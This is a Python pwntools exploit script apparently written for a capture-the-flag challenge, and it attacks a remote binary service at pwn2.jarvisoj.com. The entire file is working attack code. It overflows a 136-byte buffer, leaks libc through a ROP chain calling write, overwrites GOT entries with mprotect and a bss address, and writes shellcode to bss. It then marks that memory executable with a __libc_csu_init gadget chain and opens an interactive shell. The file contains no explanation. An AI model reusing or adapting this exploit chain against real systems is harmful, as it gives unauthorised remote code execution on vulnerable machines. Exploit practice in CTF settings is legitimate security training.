#!/usr/bin/python
from pwn import *
context.log_level='debug'
context(os='linux',arch='amd64')
#sh=process('./1')
sh=remote("pwn2.jarvisoj.com",9884)
exe=ELF('./1')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('./libc-2.19.so')
main=exe.symbols['main']
csu_front_addr = 0x400690
csu_end_addr=0x4006aa
read_plt=exe.symbols['read']
read_got=exe.got['read']
bss=exe.bss()
write_plt=exe.symbols['write']
write_got=exe.got['write']
pop_rdi=0x4006b3
pop_rsi=0x4006b1
shellcode=asm(shellcraft.amd64.sh())
def csu(rbx,rbp,r12,r13,r14,r15,last):
	payload = 'a'*136
	payload+=p64(csu_end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
	payload+=p64(csu_front_addr)
	payload+='a'*0x38
	payload+=p64(last)
	print 'payload+++++'+payload
	sh.send(payload)
	sleep(1)
	pause()

sh.recvuntil('Input:\n')
payload123='a'*136+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(read_got)+'deadbuff'+p64(write_plt)+p64(main)
sh.send(payload123)
sleep(0.2)
pause()
read_addr=u64(sh.recv(8))
libc.address=read_addr-libc.symbols['read']
mprotect=libc.symbols['mprotect']
libc_start_main_got=exe.got['__libc_start_main']
payload2='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc_start_main_got)+"deadbuff"+p64(read_plt)+p64(main)
sh.send(payload2)
sleep(0.2)
sh.send(p64(mprotect))
sleep(0.2)
pause()
#mprotect=libc.symbols['mprotect']
payloadpp='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+'deadbuff'+p64(read_plt)+p64(main)
sh.send(payloadpp)
sleep(0.2)
sh.send(shellcode)
sleep(0.2)
pause()
#libc_start_main_got=exe.got['__libc_start_main']
#payload2='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc_start_main_got)+"deadbuff"+p64(read_plt)+p64(main)
#sh.send(payload2)
#sleep(0.2)
#sh.send(p64(mprotect))
sh.recvuntil('Input:\n')
gmon_start_got=exe.got['__gmon_start__']
payload3='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(gmon_start_got)+"deadbuff"+p64(read_plt)+p64(main)
sh.send(payload3)
sleep(0.2)
sh.send(p64(bss))
sleep(0.2)
#csu2(0,1,mprotect_got,7,0x1000,0x600000,bss_got)
payloadkkp='a'*136+p64(csu_end_addr)+p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1000)+p64(0x600000)
payloadkkp+=p64(csu_front_addr)
payloadkkp+='deadbuff'+p64(0)+p64(1)+p64(gmon_start_got)+p64(0)+p64(0)+p64(0)
payloadkkp+=p64(csu_front_addr)
sleep(0.2)
pause()
sh.send(payloadkkp)
sh.interactive()


